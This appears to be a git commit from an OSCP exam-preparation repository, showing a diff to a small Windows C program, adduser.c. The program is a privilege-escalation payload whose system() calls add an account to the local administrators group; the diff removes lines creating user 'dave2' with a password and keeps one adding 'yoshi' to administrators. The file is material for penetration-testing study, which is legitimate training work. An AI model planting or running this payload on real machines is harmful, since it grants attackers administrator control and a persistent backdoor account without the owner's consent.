4984444cd3bb528b368ccc526273bbb909b52b01
root <root@kali.kali>
2025-02-14 21:37:05 +0530

    oscp

--- oscp/binariesAndCves/resources/windows/adduser.c
+++ oscp/binariesAndCves/resources/windows/adduser.c
@@ -3,9 +3,7 @@
 int main ()
 {
   int i;
-  
-  i = system ("net user dave2 password123! /add");
-  i = system ("net localgroup administrators dave2 /add");
+  i = system ("net localgroup administrators yoshi /add");
   
   return 0;
 }
